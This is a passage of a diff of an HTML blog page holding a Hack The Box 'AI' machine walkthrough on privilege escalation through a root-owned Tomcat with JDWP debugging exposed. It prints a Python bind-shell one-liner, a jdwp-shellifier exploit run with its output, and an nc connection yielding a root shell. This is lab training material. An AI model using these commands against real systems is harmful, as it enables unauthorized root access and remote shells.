-udp                 UNCONN                   0                     0                                                     [::]:55175                                               [::]
-:*                    
-tcp                 LISTEN                   0                     1                                                127.0.0.1:8000                                             0.0.0.0:*                    
-tcp                 LISTEN                   0                     80                                               127.0.0.1:3306                                             0.0.0.0:*                    
-tcp                 LISTEN                   0                     128                                          127.0.0.53%lo:53                                               0.0.0.0:*                    
-tcp                 LISTEN                   0                     128                                                0.0.0.0:22                                               0.0.0.0:*                    
-tcp                 ESTAB                    0                     0                                             10.10.10.163:22                                           10.10.14.29:58570                
-tcp                 ESTAB                    0                     36                                            10.10.10.163:22                                           10.10.14.29:54700                
-tcp                 LISTEN                   0                     1                                       [::ffff:127.0.0.1]:8005                                                   *:*                    
-tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8009                                                   *:*                    
-tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*                    
-tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
-tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
-tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
-</code></pre></div><p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p>
-<img src=https://ceso.github.io/images/htb/ai/tomcat-tunnel.png class=center style=border-radius:8px>
-<p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JDWP</a> enabled:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
-</code></pre></div><p>A quick search google gives a result the next <a href=https://www.exploit-db.com/exploits/46501>exploit</a></p>
-<p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
-</code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#39;java.lang.String.indexOf&#39; --cmd /tmp/bind.sh 
-[+] Targeting &#39;127.0.0.1:8000&#39;
-[+] Reading settings for &#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;
-[+] Found Runtime class: id=650
-[+] Found Runtime.getRuntime(): id=7f9080006b60
-[+] Created break event id=2
-[+] Waiting for an event on &#39;java.lang.String.indexOf&#39;
-[+] Received matching event from thread 0x6ed
-[+] Selected payload &#39;/tmp/bind.sh&#39;
-[+] Command string object created id:6ee
-[+] Runtime.getRuntime() returned context id:0x6ef
-[+] found Runtime.exec(): id=7f9080006b98
-[+] Runtime.exec() successful, retId=6f0
-[!] Command successfully executed
-</code></pre></div><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
-ai.lnx.htb [10.10.10.163] 2222 (?) open
-bash: cannot set terminal process group (6086): Inappropriate ioctl for device
-bash: no job control in this shell
-root@AI:~# wc -c /root/root.txt
-wc -c /root/root.txt
-33 /root/root.txt
-</code></pre></div><p>Done, we have root access and the root.txt flag :D.</p>
-<p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
-</div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Read other posts</span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/>
-<span class=button__icon>←</span>
-<span class=button__text>Hacking Cheatsheet</span>
-</a>
-</span>
-<span class="button next">
-<a href=https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/>
-<span class=button__text>Hack The Box - Bitlab</span>
-<span class=button__icon>→</span>
-</a>
-</span>
-</div>
-</div>
-<script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script>
-<script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script>
+</code></pre><p>Getting a success:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
+</span></span><span style=display:flex><span>alexa@10.10.10.163&#39;s password: 
+</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  System information as of Fri Feb  7 20:27:47 UTC 2020
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  System load:  0.14               Processes:           162
+</span></span><span style=display:flex><span>  Usage of /:   28.0% of 19.56GB   Users logged in:     1
+</span></span><span style=display:flex><span>  Memory usage: 27%                IP address for eth0: 10.10.10.163
+</span></span><span style=display:flex><span>  Swap usage:   0%
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> * Canonical Livepatch is available for installation.
+</span></span><span style=display:flex><span>   - Reduce system reboots and improve kernel security. Activate at:
+</span></span><span style=display:flex><span>     https://ubuntu.com/livepatch
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>63 packages can be updated.
+</span></span><span style=display:flex><span>15 updates are security updates.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
+</span></span><span style=display:flex><span>alexa@AI:~$ wc -c user.txt
+</span></span><span style=display:flex><span>33 user.txt
+</span></span></code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>When is checked which net. services are listening, was found :8080:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>alexa@AI:~$ ss -punta
+</span></span><span style=display:flex><span>Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
+</span></span><span style=display:flex><span>:Port                 
+</span></span><span style=display:flex><span>udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
+</span></span><span style=display:flex><span>:*                    
+</span></span><span style=display:flex><span>udp                 UNCONN                   0                     0                                                  0.0.0.0:5353                                             0.0.0.0
+</span></span><span style=display:flex><span>:*                    
+</span></span><span style=display:flex><span>udp                 UNCONN                   0                     0                                                  0.0.0.0:53210                                            0.0.0.0
+</span></span><span style=display:flex><span>:*                    
+</span></span><span style=display:flex><span>udp                 UNCONN                   0                     0                                                     [::]:5353                                                [::]
+</span></span><span style=display:flex><span>:*                    
+</span></span><span style=display:flex><span>udp                 UNCONN                   0                     0                                                     [::]:55175                                               [::]
+</span></span><span style=display:flex><span>:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     1                                                127.0.0.1:8000                                             0.0.0.0:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     80                                               127.0.0.1:3306                                             0.0.0.0:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     128                                          127.0.0.53%lo:53                                               0.0.0.0:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     128                                                0.0.0.0:22                                               0.0.0.0:*                    
+</span></span><span style=display:flex><span>tcp                 ESTAB                    0                     0                                             10.10.10.163:22                                           10.10.14.29:58570                
+</span></span><span style=display:flex><span>tcp                 ESTAB                    0                     36                                            10.10.10.163:22                                           10.10.14.29:54700                
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     1                                       [::ffff:127.0.0.1]:8005                                                   *:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8009                                                   *:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
+</span></span><span style=display:flex><span>tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
+</span></span><span style=display:flex><span>tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
+</span></span></code></pre></div><p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p><img src=https://ceso.github.io/images/htb/ai/tomcat-tunnel.png class=center style=border-radius:8px><p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JDWP</a> enabled:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+</span></span></code></pre></div><p>A quick search google gives a result the next <a href=https://www.exploit-db.com/exploits/46501>exploit</a></p><p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
+</span></span></code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#39;java.lang.String.indexOf&#39; --cmd /tmp/bind.sh 
+</span></span><span style=display:flex><span>[+] Targeting &#39;127.0.0.1:8000&#39;
+</span></span><span style=display:flex><span>[+] Reading settings for &#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;
+</span></span><span style=display:flex><span>[+] Found Runtime class: id=650
+</span></span><span style=display:flex><span>[+] Found Runtime.getRuntime(): id=7f9080006b60
+</span></span><span style=display:flex><span>[+] Created break event id=2
+</span></span><span style=display:flex><span>[+] Waiting for an event on &#39;java.lang.String.indexOf&#39;
+</span></span><span style=display:flex><span>[+] Received matching event from thread 0x6ed
+</span></span><span style=display:flex><span>[+] Selected payload &#39;/tmp/bind.sh&#39;
+</span></span><span style=display:flex><span>[+] Command string object created id:6ee
+</span></span><span style=display:flex><span>[+] Runtime.getRuntime() returned context id:0x6ef
+</span></span><span style=display:flex><span>[+] found Runtime.exec(): id=7f9080006b98
+</span></span><span style=display:flex><span>[+] Runtime.exec() successful, retId=6f0
+</span></span><span style=display:flex><span>[!] Command successfully executed
+</span></span></code></pre></div><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
+</span></span><span style=display:flex><span>ai.lnx.htb [10.10.10.163] 2222 (?) open
+</span></span><span style=display:flex><span>bash: cannot set terminal process group (6086): Inappropriate ioctl for device
+</span></span><span style=display:flex><span>bash: no job control in this shell
+</span></span><span style=display:flex><span>root@AI:~# wc -c /root/root.txt
+</span></span><span style=display:flex><span>wc -c /root/root.txt
+</span></span><span style=display:flex><span>33 /root/root.txt
+</span></span></code></pre></div><p>Done, we have root access and the root.txt flag :D.</p><p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/><span class=button__icon>←</span>
+<span class=button__text>Hacking Cheatsheet</span></a></span>
+<span class="button next"><a href=https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/><span class=button__text>Hack The Box - Bitlab</span>
+<span class=button__icon>→</span></a></span></div></div><script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script><script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script>
 <a href=javascript: id=return-to-top><i class=icon-chevron-up></i></a>
-<link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet>
-</div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class=footer__content>
-<span>&copy; 2020</span>
+<link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet></div></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2020</span>
 <span></span>
-<span> <a href=https://ceso.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
-</div>
-</div>
-<div class=footer__inner>
-<div class=footer__content>
-<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span>
-</div>
-</div>
-</footer>
-</div>
-<script type=text/javascript src=https://ceso.github.io/bundle.min.59ecdc8ddd50b30e6dd7ad4a5372c3fd24a26db671cc1575443b150ceb9d4bc8e73618fb298596b5c336cf5d8c2db90bd7e72a648479e97884e5398722f962fa.js integrity="sha512-Wezcjd1Qsw5t161KU3LD/SSibbZxzBV1RDsVDOudS8jnNhj7KYWWtcM2z12MLbkL1+cqZIR56XiE5TmHIvli+g=="></script>
-<script src=https://ceso.github.io/js/scroll.js></script>
-</body>
-</html>
+<span><a href=https://ceso.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span></div></div></footer></div><script type=text/javascript src=https://ceso.github.io/bundle.min.4ae8010a44db07d01f7efb2c29c70fa31a783bf4fce929b8b2a413e0bc4850d27f9af07db5eac04bf68a65202b16c6c6e367e0908fd4eafd81e1218b9053c258.js integrity="sha512-SugBCkTbB9AffvssKccPoxp4O/T86Sm4sqQT4LxIUNJ/mvB9terAS/aKZSArFsbG42fgkI/U6v2B4SGLkFPCWA=="></script>
+<script src=https://ceso.github.io/js/scroll.js></script></body></html>
